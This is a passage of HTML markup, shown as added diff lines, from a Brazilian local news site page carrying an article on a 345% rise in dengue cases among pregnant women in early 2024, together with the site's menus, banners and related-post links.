+		<div class="site-branding full-logo">
+                        
+            <div class="sitelogo-wrap">
+                <a itemprop="url" href="https://correiodovale.com.br/">
+                    <img src="https://correiodovale.com.br/wp-content/uploads/2024/09/logo-para-site.png" alt="" title="">
+                </a>
+                <meta itemprop="name" content="JORNAL CORREIO DO VALE">
+            </div>
+            
+        </div><!-- .site-branding -->
+    </div><!-- .apmag-container -->   
+</div><!-- .logo-ad-wrapper --><!-- header menu -->
+<nav id="site-navigation" class="main-navigation" role="navigation">
+	<div class="apmag-container">
+        <div class="nav-wrapper">
+            <div class="nav-toggle hide">
+                <span> </span>
+                <span> </span>
+                <span> </span>
+            </div>
+			<div id="apmag-header-menu" class="menu"><ul id="menu-destaques" class="menu accesspress_mag_mega_menu"><li id="menu-item-952" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-952"><a href="https://correiodovale.com.br/category/cidades/">CIDADES</a><ul class="sub-menu mega-sub-menu no-mega-cat-menu"><li class="menu-item-inner-mega clearfix"><div class="ap-mega-menu-con-wrap"><div id="cat-con-id-89" class="cat-con-section"><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2024/10/15/sequestro-relampago-em-navegantes/" title="Sequestro relâmpago em Navegantes"><img src="https://correiodovale.com.br/wp-content/uploads/2024/04/policia-240x172.jpg"></a></div><h3><a href="https://correiodovale.com.br/2024/10/15/sequestro-relampago-em-navegantes/" title="Sequestro relâmpago em Navegantes">Sequestro relâmpago em Navegantes</a></h3></div><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2024/10/14/confraternizacao-de-dia-das-criancas-movimenta-o-loteamento-primavera/" title="Confraternização de Dia das Crianças movimenta o Loteamento Primavera"><img src="https://correiodovale.com.br/wp-content/uploads/2024/10/dia-das-crianas-bairro-primavera-240x172.jpg"></a></div><h3><a href="https://correiodovale.com.br/2024/10/14/confraternizacao-de-dia-das-criancas-movimenta-o-loteamento-primavera/" title="Confraternização de Dia das Crianças movimenta o Loteamento Primavera">Confraternização de Dia das Crianças movimenta o Loteamento Primavera</a></h3></div><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2024/10/10/oportunidade-de-trabalho-na-regiao/" title="Oportunidade de trabalho na região"><img src="https://correiodovale.com.br/wp-content/uploads/2024/10/trabalho-240x172.png"></a></div><h3><a href="https://correiodovale.com.br/2024/10/10/oportunidade-de-trabalho-na-regiao/" title="Oportunidade de trabalho na região">Oportunidade de trabalho na região</a></h3></div><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2024/10/09/pesquisa-popular-revela-que-joel-soares-enfrentara-ceticismo-e-desafios-em-seu-primeiro-mandato-como-prefeito-de-ilhota/" title="Pesquisa popular revela que Joel Soares Enfrentará Ceticismo e Desafios em Seu Primeiro Mandato como Prefeito de Ilhota"><img src="https://correiodovale.com.br/wp-content/uploads/2024/10/capa-joel-soares-240x172.png"></a></div><h3><a href="https://correiodovale.com.br/2024/10/09/pesquisa-popular-revela-que-joel-soares-enfrentara-ceticismo-e-desafios-em-seu-primeiro-mandato-como-prefeito-de-ilhota/" title="Pesquisa popular revela que Joel Soares Enfrentará Ceticismo e Desafios em Seu Primeiro Mandato como Prefeito de Ilhota">Pesquisa popular revela que Joel Soares Enfrentará Ceticismo e Desafios em Seu Primeiro Mandato como Prefeito de Ilhota</a></h3></div><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2024/10/08/ilhota-no-podio-dos-campeoes-de-mandato/" title="Ilhota no Pódio dos Campeões de Mandato"><img src="https://correiodovale.com.br/wp-content/uploads/2024/10/podio-dos-vereadores-campeoes-240x172.png"></a></div><h3><a href="https://correiodovale.com.br/2024/10/08/ilhota-no-podio-dos-campeoes-de-mandato/" title="Ilhota no Pódio dos Campeões de Mandato">Ilhota no Pódio dos Campeões de Mandato</a></h3></div></div></div></li></ul></li>
+<li id="menu-item-953" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-953"><a href="https://correiodovale.com.br/category/mundo/">MUNDO</a><ul class="sub-menu mega-sub-menu no-mega-cat-menu"><li class="menu-item-inner-mega clearfix"><div class="ap-mega-menu-con-wrap"><div id="cat-con-id-90" class="cat-con-section"><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2024/04/28/santa-catarina-registra-casos-de-febre-do-oropouche-doenca-do-maruim-pela-primeira-vez-na-historia/" title="Santa Catarina registra casos de febre do Oropouche (doença do Maruim) pela primeira vez na história"><img src="https://correiodovale.com.br/wp-content/uploads/2024/04/maruim-240x172.webp"></a></div><h3><a href="https://correiodovale.com.br/2024/04/28/santa-catarina-registra-casos-de-febre-do-oropouche-doenca-do-maruim-pela-primeira-vez-na-historia/" title="Santa Catarina registra casos de febre do Oropouche (doença do Maruim) pela primeira vez na história">Santa Catarina registra casos de febre do Oropouche (doença do Maruim) pela primeira vez na história</a></h3></div><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2023/05/31/especialistas-alertam-para-risco-de-extincao-causado-pela-inteligencia-artificial/" title="Especialistas alertam para risco de extinção causado pela inteligência artificial"><img src="https://correiodovale.com.br/wp-content/uploads/2023/05/inteligencia-artificial_pode_levar_a_extincao-240x172.jpeg"></a></div><h3><a href="https://correiodovale.com.br/2023/05/31/especialistas-alertam-para-risco-de-extincao-causado-pela-inteligencia-artificial/" title="Especialistas alertam para risco de extinção causado pela inteligência artificial">Especialistas alertam para risco de extinção causado pela inteligência artificial</a></h3></div><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2023/04/20/primeiro-lancamento-da-nave-starship-pela-spacex-um-passo-gigantesco-rumo-a-exploracao-espacial/" title="Primeiro lançamento da nave Starship pela SpaceX: um passo gigantesco rumo à exploração espacial"><img src="https://correiodovale.com.br/wp-content/uploads/2023/04/Screenshot-2023-04-20-at-12-27-45-GELEIA-DE-PIMENTA-240x172.png"></a></div><h3><a href="https://correiodovale.com.br/2023/04/20/primeiro-lancamento-da-nave-starship-pela-spacex-um-passo-gigantesco-rumo-a-exploracao-espacial/" title="Primeiro lançamento da nave Starship pela SpaceX: um passo gigantesco rumo à exploração espacial">Primeiro lançamento da nave Starship pela SpaceX: um passo gigantesco rumo à exploração espacial</a></h3></div><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2022/10/29/seminarios-palestras-apresentacoes-culturais-e-premio-simeao-integram-a-programacao-em-novembro/" title="Seminários, palestras, apresentações culturais e Prêmio Simeão integram a programação em novembro"><img src="https://correiodovale.com.br/wp-content/uploads/2022/10/rasismo-240x172.jpg"></a></div><h3><a href="https://correiodovale.com.br/2022/10/29/seminarios-palestras-apresentacoes-culturais-e-premio-simeao-integram-a-programacao-em-novembro/" title="Seminários, palestras, apresentações culturais e Prêmio Simeão integram a programação em novembro">Seminários, palestras, apresentações culturais e Prêmio Simeão integram a programação em novembro</a></h3></div><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2022/04/24/emmanuel-macron-e-reeleito-presidente-da-franca/" title="Emmanuel Macron é reeleito presidente da França"><img src="https://correiodovale.com.br/wp-content/uploads/2022/04/macron-240x172.jpg"></a></div><h3><a href="https://correiodovale.com.br/2022/04/24/emmanuel-macron-e-reeleito-presidente-da-franca/" title="Emmanuel Macron é reeleito presidente da França">Emmanuel Macron é reeleito presidente da França</a></h3></div></div></div></li></ul></li>
+<li id="menu-item-954" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-954"><a href="https://correiodovale.com.br/category/esportes/">ESPORTES</a><ul class="sub-menu mega-sub-menu no-mega-cat-menu"><li class="menu-item-inner-mega clearfix"><div class="ap-mega-menu-con-wrap"><div id="cat-con-id-114" class="cat-con-section"><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2024/08/28/balneario-camboriu-surf-talentos-oceano-2024/" title="Balneário Camboriú Surf Talentos Oceano 2024"><img src="https://correiodovale.com.br/wp-content/uploads/2024/08/foto-marcio-david-240x172.jpg"></a></div><h3><a href="https://correiodovale.com.br/2024/08/28/balneario-camboriu-surf-talentos-oceano-2024/" title="Balneário Camboriú Surf Talentos Oceano 2024">Balneário Camboriú Surf Talentos Oceano 2024</a></h3></div><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2024/03/25/ihotenses-conquistam-vitoria-no-xcm-no-true/" title="Ihotenses conquistam vitória no XCM no True"><img src="https://correiodovale.com.br/wp-content/uploads/2024/03/leandro_capa-240x172.jpg"></a></div><h3><a href="https://correiodovale.com.br/2024/03/25/ihotenses-conquistam-vitoria-no-xcm-no-true/" title="Ihotenses conquistam vitória no XCM no True">Ihotenses conquistam vitória no XCM no True</a></h3></div><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2023/04/10/hegemonias-sao-mantidas-nas-decisoes-estaduais-e-fluminense-garante-bicampeonato-carioca-com-goleada-sobre-flamengo/" title="Hegemonias são mantidas nas decisões estaduais e Fluminense garante bicampeonato carioca com goleada sobre Flamengo"><img src="https://correiodovale.com.br/wp-content/uploads/2023/04/Screenshot-2023-04-10-at-12-11-01-Fluminense-puxa-fila-de-campeoes-que-mantem-soberania-nos-Estaduais-240x172.png"></a></div><h3><a href="https://correiodovale.com.br/2023/04/10/hegemonias-sao-mantidas-nas-decisoes-estaduais-e-fluminense-garante-bicampeonato-carioca-com-goleada-sobre-flamengo/" title="Hegemonias são mantidas nas decisões estaduais e Fluminense garante bicampeonato carioca com goleada sobre Flamengo">Hegemonias são mantidas nas decisões estaduais e Fluminense garante bicampeonato carioca com goleada sobre Flamengo</a></h3></div><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2022/04/19/1122/" title="Copa Brasil: Flu recebe Vila Nova"><img src="https://correiodovale.com.br/wp-content/uploads/2022/04/maracana_fluminense_estadio-240x172.jpg"></a></div><h3><a href="https://correiodovale.com.br/2022/04/19/1122/" title="Copa Brasil: Flu recebe Vila Nova">Copa Brasil: Flu recebe Vila Nova</a></h3></div><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2022/04/07/de-8-milhoes-para-novo-ginasio-em-ilhota/" title="+ de 8 milhões para novo Ginásio em Ilhota"><img src="https://correiodovale.com.br/wp-content/uploads/2022/04/novo-ginasio-ilhota-240x172.jpg"></a></div><h3><a href="https://correiodovale.com.br/2022/04/07/de-8-milhoes-para-novo-ginasio-em-ilhota/" title="+ de 8 milhões para novo Ginásio em Ilhota">+ de 8 milhões para novo Ginásio em Ilhota</a></h3></div></div></div></li></ul></li>
+<li id="menu-item-955" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-955"><a href="https://correiodovale.com.br/category/politica/">POLITICA</a><ul class="sub-menu mega-sub-menu no-mega-cat-menu"><li class="menu-item-inner-mega clearfix"><div class="ap-mega-menu-con-wrap"><div id="cat-con-id-91" class="cat-con-section"><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2024/10/09/pesquisa-popular-revela-que-joel-soares-enfrentara-ceticismo-e-desafios-em-seu-primeiro-mandato-como-prefeito-de-ilhota/" title="Pesquisa popular revela que Joel Soares Enfrentará Ceticismo e Desafios em Seu Primeiro Mandato como Prefeito de Ilhota"><img src="https://correiodovale.com.br/wp-content/uploads/2024/10/capa-joel-soares-240x172.png"></a></div><h3><a href="https://correiodovale.com.br/2024/10/09/pesquisa-popular-revela-que-joel-soares-enfrentara-ceticismo-e-desafios-em-seu-primeiro-mandato-como-prefeito-de-ilhota/" title="Pesquisa popular revela que Joel Soares Enfrentará Ceticismo e Desafios em Seu Primeiro Mandato como Prefeito de Ilhota">Pesquisa popular revela que Joel Soares Enfrentará Ceticismo e Desafios em Seu Primeiro Mandato como Prefeito de Ilhota</a></h3></div><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2024/10/08/ilhota-no-podio-dos-campeoes-de-mandato/" title="Ilhota no Pódio dos Campeões de Mandato"><img src="https://correiodovale.com.br/wp-content/uploads/2024/10/podio-dos-vereadores-campeoes-240x172.png"></a></div><h3><a href="https://correiodovale.com.br/2024/10/08/ilhota-no-podio-dos-campeoes-de-mandato/" title="Ilhota no Pódio dos Campeões de Mandato">Ilhota no Pódio dos Campeões de Mandato</a></h3></div><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2024/10/08/camara-de-ilhota-e-a-extincao-da-tribuna-livre-a-voz-do-povo-continuara-silenciada/" title="Câmara de Ilhota e a Extinção da Tribuna Livre: A Voz do Povo Continuará Silenciada?"><img src="https://correiodovale.com.br/wp-content/uploads/2024/10/tribuna-livre-240x172.jpg"></a></div><h3><a href="https://correiodovale.com.br/2024/10/08/camara-de-ilhota-e-a-extincao-da-tribuna-livre-a-voz-do-povo-continuara-silenciada/" title="Câmara de Ilhota e a Extinção da Tribuna Livre: A Voz do Povo Continuará Silenciada?">Câmara de Ilhota e a Extinção da Tribuna Livre: A Voz do Povo Continuará Silenciada?</a></h3></div><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2024/10/07/eleicoes-2024-vereadores-eleitos-em-ilhota/" title="Eleições 2024: Vereadores eleitos em Ilhota"><img src="https://correiodovale.com.br/wp-content/uploads/2024/10/vereadores-ilhota-240x172.png"></a></div><h3><a href="https://correiodovale.com.br/2024/10/07/eleicoes-2024-vereadores-eleitos-em-ilhota/" title="Eleições 2024: Vereadores eleitos em Ilhota">Eleições 2024: Vereadores eleitos em Ilhota</a></h3></div><div class="menu-post-block"><div class="mega-img-thumb"><a href="https://correiodovale.com.br/2024/10/07/a-ascensao-cautelosa-de-joel-soares-a-prefeitura-de-ilhota/" title="Joel Soares: Prefeito ou Marionete? O Desafio de Sair da Sombra do Poder"><img src="https://correiodovale.com.br/wp-content/uploads/2024/10/resultado-eleicoes-240x172.jpg"></a></div><h3><a href="https://correiodovale.com.br/2024/10/07/a-ascensao-cautelosa-de-joel-soares-a-prefeitura-de-ilhota/" title="Joel Soares: Prefeito ou Marionete? O Desafio de Sair da Sombra do Poder">Joel Soares: Prefeito ou Marionete? O Desafio de Sair da Sombra do Poder</a></h3></div></div></div></li></ul></li>
+<li id="menu-item-5247" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-5247"><a href="https://correiodovale.com.br/tv-ilhota/">TV</a></li>
+<li id="menu-item-5248" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-5248"><a href="https://correiodovale.com.br/contato">Contato</a></li>
+</ul></div>        </div><!-- .nav-wrapper -->
+            <div class="search-icon">
+    <i class="fa fa-search"></i>
+    <div class="ak-search">
+        <div class="close">×</div>
+     <form action="https://correiodovale.com.br/" class="search-form" method="get" role="search">
+        <label>
+            <span class="screen-reader-text">Search for:</span>
+            <input type="search" title="Search for:" name="s" value="" placeholder="" class="search-field">
+        </label>
+        <input type="submit" value="Busca" class="search-submit">
+     </form>
+     <div class="overlay-search"> </div> 
+    </div>
+</div> 
+    </div><!-- .apmag-container -->
+</nav><!-- #site-navigation --><div class="header-ad fullwidth">
+    
+
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Carousel</title>
+  <!-- Adicionando Bootstrap CSS -->
+  <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+  <!-- Adicionando jQuery -->
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <!-- Adicionando Bootstrap JS -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+
+
+
+<div id="carouselExampleIndicators" class="carousel slide" data-ride="carousel">
+  <div class="carousel-inner">
+    <div class="carousel-item active">
+ 
+      <a href="https://correiodovale.com.br/"><img src="https://correiodovale.com.br/wp-content/uploads/2024/05/banner-MACEDOGURGUER-728x90-1.png" alt="Fifth slide"></a>
+    </div>
+ <div class="carousel-item">
+      <a href="https://correiodovale.com.br/"><img src="https://correiodovale.com.br/wp-content/uploads/2023/11/banner-mrc-01-1.png" alt="First slide"></a>
+    </div>
+    <div class="carousel-item">
+      <a href="https://correiodovale.com.br/"><img src="https://correiodovale.com.br/wp-content/uploads/2024/04/banner-vision-hard_topo.png" alt="Second slide"></a>
+    </div>
+        <div class="carousel-item">
+      <a href="https://correiodovale.com.br/"><img src="https://correiodovale.com.br/wp-content/uploads/2024/09/BANNER-LARGE.png" alt="Fourth slide"></a>
+    </div>
+   
+  </div>
+</div>
+
+
+
+</div><!--header ad-->    </header><!-- #masthead -->
+
+    <div id="content" class="site-content">
+
+<div class="apmag-container">
+    <div id="accesspres-mag-breadcrumbs" class="clearfix"><span class="bread-you">VOCÊ ESTÁ AQUI</span><div class="ak-container"><a href="https://correiodovale.com.br">Home</a> &gt; <a href="https://correiodovale.com.br/category/cidades/">CIDADES</a></div></div>	<div id="primary" class="content-area">
+		<main id="main" class="site-main" role="main">
+
+					<article id="post-5055" class="post-5055 post type-post status-publish format-standard has-post-thumbnail hentry category-cidades category-saude">
+	<header class="entry-header">
+		<h1 class="entry-title">Casos de dengue em gestantes aumentam 345% em 2024</h1>
+		<div class="entry-meta clearfix">
+            <ul class="post-categories">
+	<li><a href="https://correiodovale.com.br/category/cidades/" rel="category tag">CIDADES</a></li>
+	<li><a href="https://correiodovale.com.br/category/saude/" rel="category tag">SAUDE</a></li></ul>            <span class="byline">  - </span><span class="posted-on"><time class="entry-date published" datetime="2024-03-02T00:26:52+00:00">Março 2, 2024</time><time class="updated" datetime="2024-03-02T00:39:57+00:00">Março 2, 2024</time></span>					</div><!-- .entry-meta -->
+        
+	</header><!-- .entry-header -->
+
+	<div class="entry-content">
+                        <div class="post_image">
+                  
+                    <img src="https://correiodovale.com.br/wp-content/uploads/2024/03/dengue.webp" alt="">
+                            </div>
+                
+        <div class="post-content">
+<p><audio src="https://tts-app.ebc.com.br/media/tts/218035.mp3"></audio></p>
+
+
+
+<p>O número de casos de dengue em gestantes aumentou 345,2% nas seis primeiras semanas deste ano, na comparação com o mesmo período de 2023, segundo dados epidemiológicos do Ministério da Saúde divulgados nesta sexta-feira (1º).&nbsp;<img decoding="async" src="https://agenciabrasil.ebc.com.br/ebc.png?id=1583827&amp;o=node"><img decoding="async" src="https://agenciabrasil.ebc.com.br/ebc.gif?id=1583827&amp;o=node"></p>
+
+
+
+<p>“Este aumento representa um quadro preocupante de saúde pública, considerando o risco elevado de complicações graves, tanto para elas quanto para os bebês. Formas graves da doença, como choque, hemorragias e óbito representam riscos para as gestantes, enquanto as complicações perinatais incluem prematuridade, restrição de crescimento intrauterino e morte fetal”, informou a pasta.&nbsp;</p>
+
+
+
+<p>Segundo o ministério, em 2023 foram registrados 1.530.940 casos prováveis no país, com um coeficiente de incidência de 753,9 casos por 100 mil habitantes, o que representa um aumento de 16,5% em comparação com o ano anterior.</p>
+
+
+
+<p>Desde o início do ano, o Brasil registrou 1.038.475 casos prováveis de dengue e 258 mortes confirmadas pela doença. Outros 651 óbitos estão em investigação. O coeficiente de incidência da dengue no país neste momento é de 511,4 casos para cada grupo de 100 mil habitantes, segundo o Painel de Monitoramento das Arboviroses.</p>
+<div class="sfsiaftrpstwpr"><div class="sfsi_responsive_icons" style="display:block;margin-top:10px; margin-bottom: 10px; width:100%" data-icon-width-type="Fully responsive" data-icon-width-size="240" data-edge-type="Round" data-edge-radius="5"><div class="sfsi_icons_container sfsi_responsive_without_counter_icons sfsi_medium_button_container sfsi_icons_container_box_fully_container " style="width:100%;display:flex; text-align:center;"><a target="_blank" rel="noopener" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fcorreiodovale.com.br%2F2024%2F03%2F02%2Fcasos-de-dengue-em-gestantes-aumentam-345-em-2024%2F" style="display:block;text-align:center;margin-left:10px;  flex-basis:100%;" class="sfsi_responsive_fluid"><div class="sfsi_responsive_icon_item_container sfsi_responsive_icon_facebook_container sfsi_medium_button sfsi_responsive_icon_gradient sfsi_centered_icon" style=" border-radius:5px; width:auto; "><img style="max-height: 25px;display:unset;margin:0" class="sfsi_wicon" alt="facebook" src="https://correiodovale.com.br/wp-content/plugins/ultimate-social-media-icons/images/responsive-icon/facebook.svg"><span style="color:#fff">Compartilhar no Face</span></div></a><a target="_blank" rel="noopener" href="https://twitter.com/intent/tweet?text=Oi+achei+essa+mat%C3%A9ria+bem+legal%2C+veja%3A&amp;url=https%3A%2F%2Fcorreiodovale.com.br%2F2024%2F03%2F02%2Fcasos-de-dengue-em-gestantes-aumentam-345-em-2024%2F" style="display:block;text-align:center;margin-left:10px;  flex-basis:100%;" class="sfsi_responsive_fluid"><div class="sfsi_responsive_icon_item_container sfsi_responsive_icon_twitter_container sfsi_medium_button sfsi_responsive_icon_gradient sfsi_centered_icon" style=" border-radius:5px; width:auto; "><img style="max-height: 25px;display:unset;margin:0" class="sfsi_wicon" alt="Twitter" src="https://correiodovale.com.br/wp-content/plugins/ultimate-social-media-icons/images/responsive-icon/Twitter.svg"><span style="color:#fff">Tweet</span></div></a><a target="_blank" rel="noopener" href="https://api.follow.it/widgets/icon/QWwxVFNmc3R4UmNPUUsveDJVVUFCWWdVcFB4UERneTZWYmQxL3RaYlZ2aWhJWkxTblFod2lPcHpaUDk3Mng4YTk2Ny9aWk55VmhLM2VoMjRJRUpYL205dnhWQlkvL0RyNFZSWUN6QkpoRExwRU9zanZZUXZqdUphL3NBVEtqZWV8UWt4dVI0NW5ZcEdZOC9GYi9VL0JPMEtWRktLcnNrRDZWQmNad2dydEpUZz0=/OA==/" style="display:block;text-align:center;margin-left:10px;  flex-basis:100%;" class="sfsi_responsive_fluid"><div class="sfsi_responsive_icon_item_container sfsi_responsive_icon_follow_container sfsi_medium_button sfsi_responsive_icon_gradient sfsi_centered_icon" style=" border-radius:5px; width:auto; "><img style="max-height: 25px;display:unset;margin:0" class="sfsi_wicon" alt="Follow" src="https://correiodovale.com.br/wp-content/plugins/ultimate-social-media-icons/images/responsive-icon/Follow.png"><span style="color:#fff">Envie essa materia por email</span></div></a></div></div></div><!--end responsive_icons--></div>
+        
+                    <div class="article-ad-section">
+                <a href="https://correiodovale.com.br/"><img src="https://correiodovale.com.br/wp-content/uploads/2024/09/BANNER-LARGE.png" alt="Fourth slide"></a>            </div>
+        		        
+	</div><!-- .entry-content -->
+
+	<footer class="entry-footer">
+        		        
+	</footer><!-- .entry-footer -->
+</article><!-- #post-## -->
+            	<nav class="navigation post-navigation clearfix" role="navigation">
+		<h2 class="screen-reader-text">Post navigation</h2>
+		<div class="nav-links">
+			<div class="nav-previous"><div class="link-caption"><i class="fa fa-angle-left"></i>Anterior</div><a href="https://correiodovale.com.br/2024/02/25/policia-civil-desmantela-esquema-de-contrafacao-envolvendo-grandes-empresas-texteis/" rel="prev">Polícia Civil desmantela esquema de envolvendo grandes empresas têxteis</a></div><div class="nav-next"><div class="link-caption">Próximo<i class="fa fa-angle-right"></i></div><a href="https://correiodovale.com.br/2024/03/05/escandalo-em-ilhota-secretaria-de-educacao-e-exonerada-e-renomeada-em-tempo-recorde/" rel="next">Escândalo em Ilhota: Secretária de Educação é Exonerada e Renomeada em Tempo Recorde</a></div>		</div><!-- .nav-links -->
+	</nav><!-- .navigation -->
+	
+    <h2 class="similar-posts-main-title"><span>Veja também</span></h2>
+    <div class="similar-posts clearfix">
+              <div class="single_post left-post non-zoomin clearfix">
+                       <div class="post-image">
+                <a href="https://correiodovale.com.br/2023/03/23/ilhota-e-atingida-por-fortes-chuvas-assustando-moradores/" title="Ilhota é atingida por fortes chuvas  assustando moradores">
+                                            <img src="https://correiodovale.com.br/wp-content/uploads/2023/03/alagamento-ilhota-554x305.png" alt="">
+                                    </a>
+                <a class="big-image-overlay" href="https://correiodovale.com.br/2023/03/23/ilhota-e-atingida-por-fortes-chuvas-assustando-moradores/" title="Ilhota é atingida por fortes chuvas  assustando moradores"><i class="fa fa-external-link"></i></a>
+                             </div>
+             <h4 class="post-title"><a href="https://correiodovale.com.br/2023/03/23/ilhota-e-atingida-por-fortes-chuvas-assustando-moradores/" rel="bookmark" title="Ilhota é atingida por fortes chuvas  assustando moradores">Ilhota é atingida por fortes chuvas  assustando moradores</a></h4><!--/.post-title-->
+             <div class="ratings-wrapper"></div>
+             <div class="block-poston"><span class="posted-on"><a href="https://correiodovale.com.br/2023/03/23/ilhota-e-atingida-por-fortes-chuvas-assustando-moradores/" rel="bookmark"><time class="entry-date published" datetime="2023-03-23T15:03:34+00:00">Março 23, 2023</time><time class="updated" datetime="2023-03-23T16:01:16+00:00">Março 23, 2023</time></a></span></div>
+       </div><!--/.single_post-->
+              <div class="single_post  non-zoomin clearfix">
+                       <div class="post-image">
+                <a href="https://correiodovale.com.br/2023/01/31/empresario-ilhotense-perde-tudo-em-incendio/" title="Empresário Ilhotense perde tudo em incêndio">
+                                            <img src="https://correiodovale.com.br/wp-content/uploads/2023/01/WhatsApp-Image-2023-01-28-at-15.58.22-1-554x305.jpeg" alt="">
+                                    </a>
+                <a class="big-image-overlay" href="https://correiodovale.com.br/2023/01/31/empresario-ilhotense-perde-tudo-em-incendio/" title="Empresário Ilhotense perde tudo em incêndio"><i class="fa fa-external-link"></i></a>
+                             </div>
+             <h4 class="post-title"><a href="https://correiodovale.com.br/2023/01/31/empresario-ilhotense-perde-tudo-em-incendio/" rel="bookmark" title="Empresário Ilhotense perde tudo em incêndio">Empresário Ilhotense perde tudo em incêndio</a></h4><!--/.post-title-->
+             <div class="ratings-wrapper"></div>
+             <div class="block-poston"><span class="posted-on"><a href="https://correiodovale.com.br/2023/01/31/empresario-ilhotense-perde-tudo-em-incendio/" rel="bookmark"><time class="entry-date published" datetime="2023-01-31T14:20:23+00:00">Janeiro 31, 2023</time><time class="updated" datetime="2023-01-31T14:50:34+00:00">Janeiro 31, 2023</time></a></span></div>
+       </div><!--/.single_post-->
+              <div class="single_post left-post non-zoomin clearfix">
+                       <div class="post-image">
+                <a href="https://correiodovale.com.br/2023/10/15/moradores-do-bairro-europeu-em-ilhota-se-mobilizam-para-limpar-ruas-em-protesto-contra-o-descaso-da-prefeitura/" title="Moradores do Bairro Europeu em Ilhota se Mobilizam para Limpar Ruas em Protesto Contra o Descaso da Prefeitura">
+                                            <img src="https://correiodovale.com.br/wp-content/uploads/2023/10/WhatsApp-Image-2023-10-15-at-18.24.28-554x305.jpeg" alt="">
+                                    </a>
+                <a class="big-image-overlay" href="https://correiodovale.com.br/2023/10/15/moradores-do-bairro-europeu-em-ilhota-se-mobilizam-para-limpar-ruas-em-protesto-contra-o-descaso-da-prefeitura/" title="Moradores do Bairro Europeu em Ilhota se Mobilizam para Limpar Ruas em Protesto Contra o Descaso da Prefeitura"><i class="fa fa-external-link"></i></a>
+                             </div>
+             <h4 class="post-title"><a href="https://correiodovale.com.br/2023/10/15/moradores-do-bairro-europeu-em-ilhota-se-mobilizam-para-limpar-ruas-em-protesto-contra-o-descaso-da-prefeitura/" rel="bookmark" title="Moradores do Bairro Europeu em Ilhota se Mobilizam para Limpar Ruas em Protesto Contra o Descaso da Prefeitura">Moradores do Bairro Europeu em Ilhota se Mobilizam para Limpar Ruas em Protesto Contra o Descaso da Prefeitura</a></h4><!--/.post-title-->
+             <div class="ratings-wrapper"></div>
+             <div class="block-poston"><span class="posted-on"><a href="https://correiodovale.com.br/2023/10/15/moradores-do-bairro-europeu-em-ilhota-se-mobilizam-para-limpar-ruas-em-protesto-contra-o-descaso-da-prefeitura/" rel="bookmark"><time class="entry-date published" datetime="2023-10-15T21:39:42+00:00">Outubro 15, 2023</time><time class="updated" datetime="2023-10-16T14:09:31+00:00">Outubro 16, 2023</time></a></span></div>
+       </div><!--/.single_post-->
+              <div class="single_post  non-zoomin clearfix">
+                       <div class="post-image">
+                <a href="https://correiodovale.com.br/2021/03/25/vacinacao-dos-idosos-com-70-anos-ou-mais-comeca-nesta-quinta-feira/" title="Vacinação dos idosos com 70 anos ou mais começa nesta quinta-feira">
+                                            <img src="https://correiodovale.com.br/wp-content/uploads/2021/03/Screenshot_2021-03-25-Prefeitura-de-Balneario-Camboriu-554x305.png" alt="">
+                                    </a>
+                <a class="big-image-overlay" href="https://correiodovale.com.br/2021/03/25/vacinacao-dos-idosos-com-70-anos-ou-mais-comeca-nesta-quinta-feira/" title="Vacinação dos idosos com 70 anos ou mais começa nesta quinta-feira"><i class="fa fa-external-link"></i></a>
+                             </div>
+             <h4 class="post-title"><a href="https://correiodovale.com.br/2021/03/25/vacinacao-dos-idosos-com-70-anos-ou-mais-comeca-nesta-quinta-feira/" rel="bookmark" title="Vacinação dos idosos com 70 anos ou mais começa nesta quinta-feira">Vacinação dos idosos com 70 anos ou mais começa nesta quinta-feira</a></h4><!--/.post-title-->
+             <div class="ratings-wrapper"></div>
+             <div class="block-poston"><span class="posted-on"><a href="https://correiodovale.com.br/2021/03/25/vacinacao-dos-idosos-com-70-anos-ou-mais-comeca-nesta-quinta-feira/" rel="bookmark"><time class="entry-date published" datetime="2021-03-25T18:11:35+00:00">Março 25, 2021</time><time class="updated" datetime="2021-03-25T18:11:38+00:00">Março 25, 2021</time></a></span></div>
+       </div><!--/.single_post-->
+           </div><!--/.post-similar-->
+
+<div id="comments" class="comments-area">
+
+	
+	
+	
+		<div id="respond" class="comment-respond">
